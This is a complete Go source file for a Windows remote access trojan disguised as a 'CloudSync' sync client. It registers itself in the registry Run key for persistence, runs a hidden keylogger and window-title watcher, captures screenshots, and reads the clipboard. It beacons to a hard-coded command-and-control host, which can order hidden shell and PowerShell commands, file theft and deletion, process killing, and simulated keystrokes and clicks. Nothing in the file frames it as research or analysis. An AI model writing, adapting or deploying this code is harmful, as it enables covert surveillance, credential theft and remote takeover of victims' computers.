//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/image/draw"
	"golang.org/x/sys/windows"
)

const (
	appVer   = "2.1.4"
	protoVer = "2.1.4"
	pollMs   = 2500
	batchMs  = 10000
)

var c2List = []string{"https://cloudsync-service.onrender.com"}

type State struct {
	DeviceID string `json:"device_id"`
	Token    string `json:"token"`
	C2       string `json:"c2"`
}

var (
	state   State
	stateMu sync.Mutex

	scaleMu   sync.Mutex
	lastScale = 1.0

	evMu   sync.Mutex
	events []map[string]any
	shots  []map[string]any

	httpc = &http.Client{Timeout: 20 * time.Second}
	start = time.Now()
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procSetCursorPos     = user32.NewProc("SetCursorPos")
	procMouseEvent       = user32.NewProc("mouse_event")
	procKeybdEvent       = user32.NewProc("keybd_event")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procGetForeground    = user32.NewProc("GetForegroundWindow")
	procGetWindowText    = user32.NewProc("GetWindowTextW")
)

/* ---------------- utilidades ---------------- */

func appDir() string {
	base := os.Getenv("APPDATA")
	if base == "" {
		base, _ = os.UserHomeDir()
	}
	d := filepath.Join(base, "CloudSync")
	os.MkdirAll(d, 0o755)
	return d
}

func logf(f string, a ...any) {
	fh, err := os.OpenFile(filepath.Join(appDir(), "log.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer fh.Close()
	fmt.Fprintf(fh, "%s  %s\n", time.Now().Format("02/01 15:04:05"), fmt.Sprintf(f, a...))
}

func str(v any) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprint(v)
}

func f64(v any) float64 {
	switch t := v.(type) {
	case float64:
		return t
	case int:
		return float64(t)
	case string:
		n, _ := strconv.ParseFloat(t, 64)
		return n
	}
	return 0
}

func hostname() string { h, _ := os.Hostname(); return h }

func osVersion() string {
	v := windows.RtlGetVersion()
	return fmt.Sprintf("Windows %d.%d.%d", v.MajorVersion, v.MinorVersion, v.BuildNumber)
}

func hidden(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

/* ---------------- estado ---------------- */

func statePath() string { return filepath.Join(appDir(), "state.json") }

func loadState() {
	b, err := os.ReadFile(statePath())
	if err != nil {
		return
	}
	json.Unmarshal(b, &state)
	if state.C2 == "" {
		state.C2 = c2List[0]
	}
}

func saveState() {
	stateMu.Lock()
	defer stateMu.Unlock()
	b, _ := json.MarshalIndent(state, "", "  ")
	os.WriteFile(statePath(), b, 0o644)
}

/* ---------------- HTTP ---------------- */

func call(path string, body any, auth bool) (map[string]any, int, error) {
	raw, _ := json.Marshal(body)
	req, err := http.NewRequest("POST", state.C2+path, bytes.NewReader(raw))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "es-CO,es;q=0.9")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 CloudSync/"+appVer)
	if auth && state.DeviceID != "" {
		req.Header.Set("X-Sync-Id", state.DeviceID)
		req.Header.Set("X-Sync-Key", state.Token)
	}
	resp, err := httpc.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var m map[string]any
	json.Unmarshal(b, &m)
	return m, resp.StatusCode, nil
}

func register() bool {
	body := map[string]any{
		"label": hostname(), "platform": "windows", "model": hostname(),
		"os_ver": osVersion(), "app_ver": appVer, "protocol": protoVer,
	}
	if state.DeviceID != "" {
		body["device_id"] = state.DeviceID
		body["token"] = state.Token
	}
	m, code, err := call("/api/v1/sync/register", body, false)
	if err != nil || code >= 300 {
		logf("register fallo: %v %d", err, code)
		return false
	}
	state.DeviceID = str(m["device_id"])
	state.Token = str(m["token"])
	saveState()
	logf("registrado %s known=%v", state.DeviceID, m["known"])
	return true
}

/* ---------------- cola y push ---------------- */

func pushEvent(t string, data any) {
	evMu.Lock()
	defer evMu.Unlock()
	if len(events) > 6000 {
		events = events[len(events)-5000:]
	}
	events = append(events, map[string]any{"ts": time.Now().UnixMilli(), "type": t, "data": data})
}

func pushShot(m map[string]any) {
	evMu.Lock()
	defer evMu.Unlock()
	shots = append(shots, m)
	if len(shots) > 40 {
		shots = shots[len(shots)-40:]
	}
}

func pushAll() {
	evMu.Lock()
	if len(events) == 0 && len(shots) == 0 {
		evMu.Unlock()
		return
	}
	ev := events
	sh := shots
	events, shots = nil, nil
	evMu.Unlock()

	_, code, err := call("/api/v1/sync/push", map[string]any{"events": ev, "shots": sh}, true)
	if err != nil || code >= 300 {
		evMu.Lock()
		events = append(ev, events...)
		shots = append(sh, shots...)
		evMu.Unlock()
		logf("push fallo %v %d", err, code)
	}
}

/* ---------------- comandos ---------------- */

func runShell(c string) (string, error) {
	if strings.TrimSpace(c) == "" {
		return "", nil
	}
	cmd := exec.Command("cmd", "/c", c)
	hidden(cmd)
	out, err := cmd.CombinedOutput()
	s := string(out)
	if len(s) > 120000 {
		s = s[:120000]
	}
	return s, err
}

func runPS(script string) (string, error) {
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", script)
	hidden(cmd)
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func takeShot() string {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return "sin pantalla"
	}
	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
	if err != nil {
		return "err:" + err.Error()
	}
	w, h := img.Bounds().Dx(), img.Bounds().Dy()
	sc := 1.0
	if w > 1280 {
		sc = 1280.0 / float64(w)
	}
	nw, nh := int(float64(w)*sc), int(float64(h)*sc)
	var src image.Image = img
	if sc < 1.0 {
		dst := image.NewRGBA(image.Rect(0, 0, nw, nh))
		draw.ApproxBiLinear.Scale(dst, dst.Bounds(), img, img.Bounds(), draw.Over, nil)
		src = dst
	}
	scaleMu.Lock()
	lastScale = sc
	scaleMu.Unlock()

	var buf bytes.Buffer
	jpeg.Encode(&buf, src, &jpeg.Options{Quality: 60})
	pushShot(map[string]any{
		"ts": time.Now().UnixMilli(), "hash": fmt.Sprintf("%dx%d-%d", nw, nh, buf.Len()),
		"w": nw, "h": nh, "mime": "image/jpeg", "screen": "main",
		"data": base64.StdEncoding.EncodeToString(buf.Bytes()),
	})
	return fmt.Sprintf("captura %dx%d %dKB", nw, nh, buf.Len()/1024)
}

func tap(x, y int) {
	scaleMu.Lock()
	sc := lastScale
	scaleMu.Unlock()
	rx, ry := int(float64(x)/sc), int(float64(y)/sc)
	procSetCursorPos.Call(uintptr(rx), uintptr(ry))
	time.Sleep(60 * time.Millisecond)
	procMouseEvent.Call(0x0002, 0, 0, 0, 0)
	time.Sleep(40 * time.Millisecond)
	procMouseEvent.Call(0x0004, 0, 0, 0, 0)
}

func keyCombo(mod, key byte) {
	procKeybdEvent.Call(uintptr(mod), 0, 0, 0)
	procKeybdEvent.Call(uintptr(key), 0, 0, 0)
	procKeybdEvent.Call(uintptr(key), 0, 2, 0)
	procKeybdEvent.Call(uintptr(mod), 0, 2, 0)
}

var vkMap = map[string]byte{
	"tab": 0x09, "enter": 0x0D, "esc": 0x1B, "space": 0x20, "del": 0x2E,
	"end": 0x23, "pageup": 0x21, "pagedown": 0x22, "up": 0x26, "down": 0x28,
	"left": 0x25, "right": 0x27, "menu": 0x5D, "f5": 0x74, "f11": 0x7A, "f12": 0x7B,
	"vol_up": 0xAF, "vol_down": 0xAE, "vol_mute": 0xAD,
}

func pressKey(code string) {
	switch code {
	case "back":
		keyCombo(0x12, 0x25)
	case "home":
		procKeybdEvent.Call(0x5B, 0, 0, 0)
		procKeybdEvent.Call(0x5B, 0, 2, 0)
	case "recents":
		keyCombo(0x12, 0x09)
	case "lock":
		keyCombo(0x5B, 0x4C)
	case "power":
		keyCombo(0x12, 0x73)
	default:
		if vk, ok := vkMap[code]; ok {
			procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
			procKeybdEvent.Call(uintptr(vk), 0, 2, 0)
		}
	}
}

func clipGet() string {
	out, _ := runPS("Get-Clipboard -Raw")
	return out
}

func clipSet(t string) {
	fp := filepath.Join(appDir(), "clip.tmp")
	os.WriteFile(fp, []byte(t), 0o644)
	runPS("Set-Clipboard -Value ([IO.File]::ReadAllText('" + fp + "'))")
}

func typeText(t string) {
	if t == "" {
		return
	}
	clipSet(t)
	time.Sleep(120 * time.Millisecond)
	keyCombo(0x11, 0x56)
}

func listFiles(dir, pattern string) string {
	if dir == "" {
		dir = "."
	}
	ent, err := os.ReadDir(dir)
	if err != nil {
		return `{"error":"` + err.Error() + `"}`
	}
	out := []map[string]any{}
	for _, e := range ent {
		info, _ := e.Info()
		var sz int64
		if info != nil {
			sz = info.Size()
		}
		if pattern != "" && !strings.Contains(strings.ToLower(e.Name()), strings.ToLower(pattern)) {
			continue
		}
		out = append(out, map[string]any{"name": e.Name(), "dir": e.IsDir(), "size": sz})
		if len(out) >= 400 {
			break
		}
	}
	b, _ := json.Marshal(out)
	return string(b)
}

func fileGet(p string) string {
	b, err := os.ReadFile(p)
	if err != nil {
		return "err:" + err.Error()
	}
	if len(b) > 140000 {
		return fmt.Sprintf("archivo grande (%d bytes). Usa un archivo mas chico.", len(b))
	}
	return base64.StdEncoding.EncodeToString(b)
}

func infoJSON() string {
	var ms windows.MemoryStatusEx
	ms.Length = uint32(unsafe.Sizeof(ms))
	windows.GlobalMemoryStatusEx(&ms)
	d := map[string]any{
		"host": hostname(), "user": os.Getenv("USERNAME"), "os": osVersion(),
		"arch": runtime.GOARCH, "cpus": runtime.NumCPU(),
		"ram_total_mb": ms.TotalPhys / 1048576, "ram_free_mb": ms.AvailPhys / 1048576,
		"device_id": state.DeviceID, "uptime_s": int(time.Since(start).Seconds()),
	}
	b, _ := json.Marshal(d)
	return string(b)
}

func storageJSON() string {
	var free, total, totalFree uint64
	windows.GetDiskFreeSpaceEx("C:\\", &free, &total, &totalFree)
	d := map[string]any{"unidad": "C:", "libre_gb": free / 1073741824, "total_gb": total / 1073741824}
	b, _ := json.Marshal(d)
	return string(b)
}

func batteryJSON() string {
	st, err := windows.GetSystemPowerStatus()
	if err != nil {
		return "err:" + err.Error()
	}
	d := map[string]any{"pct": st.BatteryLifePercent, "ac": st.ACLineStatus == 1}
	b, _ := json.Marshal(d)
	return string(b)
}

func netJSON() string {
	ips := []string{}
	ifs, _ := net.Interfaces()
	for _, i := range ifs {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			ips = append(ips, i.Name+" "+a.String())
		}
	}
	d := map[string]any{"interfaces": ips, "hostname": hostname()}
	b, _ := json.Marshal(d)
	return string(b)
}

func execute(cmd string, a map[string]any) (string, bool) {
	switch cmd {
	case "ping":
		return fmt.Sprintf(`{"pong":%d,"uptime":%d}`, time.Now().UnixMilli(), int(time.Since(start).Seconds())), true
	case "device_id":
		return fmt.Sprintf(`{"id":%q,"host":%q}`, state.DeviceID, hostname()), true
	case "info":
		return infoJSON(), true
	case "shell":
		out, err := runShell(str(a["cmd"]))
		if err != nil {
			return out + "\n" + err.Error(), false
		}
		return out, true
	case "screenshot":
		return takeShot(), true
	case "tap":
		tap(int(f64(a["x"])), int(f64(a["y"])))
		return "ok", true
	case "text":
		typeText(str(a["text"]))
		return "ok", true
	case "key":
		pressKey(str(a["code"]))
		return "ok", true
	case "clip":
		return clipGet(), true
	case "clip_set":
		clipSet(str(a["text"]))
		return "ok", true
	case "files":
		return listFiles(str(a["path"]), str(a["pattern"])), true
	case "file_get":
		return fileGet(str(a["path"])), true
	case "file_del":
		if err := os.Remove(str(a["path"])); err != nil {
			return "err:" + err.Error(), false
		}
		return "ok", true
	case "processes":
		out, _ := runShell("tasklist /fo csv /nh")
		return out, true
	case "storage":
		return storageJSON(), true
	case "battery_info":
		return batteryJSON(), true
	case "net_info":
		return netJSON(), true
	case "open":
		runShell(`start "" "` + str(a["pkg"]) + `"`)
		return "ok", true
	case "kill":
		runShell("taskkill /F /IM " + str(a["pkg"]))
		return "ok", true
	case "lock":
		keyCombo(0x5B, 0x4C)
		return "ok", true
	case "sleep":
		time.Sleep(time.Duration(f64(a["ms"])) * time.Millisecond)
		return "ok", true
	case "die":
		return "ok", true
	}
	return "unsupported:" + cmd, true
}

/* ---------------- vigilantes ---------------- */

func keylogger() {
	var prev [256]bool
	var buf strings.Builder
	last := time.Now()
	for range time.NewTicker(20 * time.Millisecond).C {
		for vk := 0x08; vk <= 0xFE; vk++ {
			r, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
			down := int16(r)&0x8000 != 0
			if down && !prev[vk] {
				if c := vkToChar(byte(vk)); c != "" {
					buf.WriteString(c)
				}
			}
			prev[vk] = down
		}
		if time.Since(last) > 10*time.Second && buf.Len() > 0 {
			pushEvent("key", map[string]any{"text": buf.String()})
			buf.Reset()
			last = time.Now()
		}
	}
}

func vkToChar(vk byte) string {
	shift := func() bool { r, _, _ := procGetAsyncKeyState.Call(0x10); return int16(r)&0x8000 != 0 }
	switch {
	case vk >= 0x41 && vk <= 0x5A:
		c := string(rune('a' + vk - 0x41))
		if shift() {
			c = strings.ToUpper(c)
		}
		return c
	case vk >= 0x30 && vk <= 0x39:
		if shift() {
			return "!@#$%^&*()"[vk-0x30 : vk-0x30+1]
		}
		return string(rune('0' + vk - 0x30))
	case vk == 0x20:
		return " "
	case vk == 0x0D:
		return "[Enter]"
	case vk == 0x08:
		return "[Back]"
	case vk == 0x09:
		return "[Tab]"
	case vk == 0x1B:
		return "[Esc]"
	case vk == 0x2E:
		return "[Del]"
	}
	return ""
}

func fgWatcher() {
	last := ""
	for range time.NewTicker(2 * time.Second).C {
		hwnd, _, _ := procGetForeground.Call()
		if hwnd == 0 {
			continue
		}
		buf := make([]uint16, 512)
		procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 512)
		t := syscall.UTF16ToString(buf)
		if t != "" && t != last {
			last = t
			pushEvent("app_fg", map[string]any{"pkg": t, "ts": time.Now().UnixMilli()})
		}
	}
}

func autostart() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	runShell(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CloudSync /d "` + exe + `" /f`)
}

/* ---------------- bucle principal ---------------- */

var backoffList = []int{1000, 2000, 4000, 8000, 16000, 30000, 60000, 120000, 300000}

func sleepBackoff(i *int) {
	d := backoffList[*i]
	if *i < len(backoffList)-1 {
		*i++
	}
	time.Sleep(time.Duration(d+rand.Intn(d/4+1)) * time.Millisecond)
}

func main() {
	loadState()
	if state.C2 == "" {
		state.C2 = c2List[0]
	}
	logf("inicio v%s c2=%s", appVer, state.C2)

	autostart()
	time.Sleep(5 * time.Second)

	go keylogger()
	go fgWatcher()

	if !register() {
		time.Sleep(10 * time.Second)
		register()
	}

	back := 0
	lastPush := time.Now()

	for {
		m, code, err := call("/api/v1/sync/beacon", map[string]any{
			"battery": batteryPct(), "charging": true, "net": "wifi", "screen_on": true,
		}, true)

		if code == 401 {
			logf("401 -> re-registro")
			register()
			sleepBackoff(&back)
			continue
		}
		if err != nil || code >= 300 {
			logf("beacon err %v %d", err, code)
			sleepBackoff(&back)
			continue
		}
		back = 0

		if cmds, ok := m["commands"].([]any); ok {
			for _, c := range cmds {
				cm, _ := c.(map[string]any)
				if cm == nil {
					continue
				}
				name := str(cm["cmd"])
				args, _ := cm["args"].(map[string]any)
				if args == nil {
					args = map[string]any{}
				}
				logf("cmd %s", name)
				out, ok2 := execute(name, args)
				call("/api/v1/sync/result", map[string]any{
					"id": int(f64(cm["id"])), "ok": ok2, "result": out,
				}, true)
				if name == "die" {
					time.Sleep(500 * time.Millisecond)
					os.Exit(0)
				}
			}
		}

		if time.Since(lastPush) > time.Duration(batchMs)*time.Millisecond {
			pushAll()
			lastPush = time.Now()
		}

		jitter := time.Duration(rand.Intn(1600)-800) * time.Millisecond
		time.Sleep(time.Duration(pollMs)*time.Millisecond + jitter)
	}
}

func batteryPct() int {
	st, err := windows.GetSystemPowerStatus()
	if err != nil {
		return 0
	}
	return int(st.BatteryLifePercent)
}
